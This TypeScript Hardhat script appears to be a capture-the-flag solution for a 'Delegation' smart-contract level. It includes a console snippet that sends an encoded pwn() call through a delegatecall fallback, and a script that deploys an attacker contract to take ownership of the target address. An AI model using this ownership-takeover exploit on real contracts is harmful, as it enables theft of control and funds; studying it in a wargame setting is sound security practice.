//Delegation Solution(run in console)
/*
const iface = new _ethers.utils.Interface(['function pwn()']);
const data = iface.encodeFunctionData('pwn');
await contract.sendTransaction({ data, gasLimit: 100000 });
//gasLimit has been explicitly set because gas estimations might fail when making delegate calls.
*/

//This Code will make Attacker Contact as new owner
import { TransactionResponse } from '@ethersproject/providers';
import { ethers } from 'hardhat';

const CONTRACT_NAME = 'Delegation';
const ATTACKER_NAME = 'DelegationAttacker';
const CONTRACT_ADDRESS = '0x9F3242e4C16C606abEB8E885FDe48dFB53003335';

export async function main() {
  let tx: TransactionResponse;

  const factory = await ethers.getContractFactory(CONTRACT_NAME);
  const contract = factory.attach(CONTRACT_ADDRESS);

  const attackerFactory = await ethers.getContractFactory(ATTACKER_NAME);
  const attackerContract = await attackerFactory.deploy(contract.address);
  await attackerContract.deployed();
  await attackerContract.deployTransaction.wait(6);
  console.log('Attacker Contract deployed to:', attackerContract.address);
  console.log(`Performing attack...`);
  tx = await attackerContract.attack();
  await tx.wait(2);
}

main().catch((error) => {
  console.error(error);
  process.exit(1);
});
